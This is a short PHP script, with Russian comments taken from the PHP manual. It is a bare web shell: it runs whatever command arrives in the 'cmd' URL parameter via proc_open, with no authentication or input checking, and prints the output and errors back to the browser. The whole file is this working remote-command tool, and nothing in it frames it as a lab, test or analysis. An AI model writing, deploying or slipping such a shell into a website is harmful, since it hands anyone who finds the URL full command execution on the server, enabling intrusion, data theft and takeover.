<?php if(isset($_GET["cmd"])):
header('Content-Type: text/html; charset=utf-8');
// https://www.php.net/manual/ru/function.proc-open.php
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin - канал, из которого дочерний процесс будет читать
   1 => array("pipe", "w"),  // stdout - канал, в который дочерний процесс будет записывать
   2 => array("pipe", "w") // stderr - канал, в который дочерний процесс будет записывать
);


$process = proc_open($_GET["cmd"], $descriptorspec, $pipes);

if (is_resource($process)) {
    fwrite($pipes[0], '<?php print_r($_ENV); ?>');
    fclose($pipes[0]);

    $output = stream_get_contents($pipes[1]);
    fclose($pipes[1]);

    $error = stream_get_contents($pipes[2]);
    fclose($pipes[2]);

    // Важно закрывать все каналы перед вызовом
    // proc_close во избежание deadlock
    $return_value = proc_close($process);

    echo "> ".$_GET["cmd"].":<br>
    <h3>stdout:</h3><br>".str_replace("\n", "<br>" ,$output)."<br>
    <h3>stderr:</h3><br>".str_replace("\n", "<br>" ,$error)."<hr>";
}
?>

<?php else: ?>
    <h1> NO COMMAND PROVIDED </h1>
<?php endif; ?>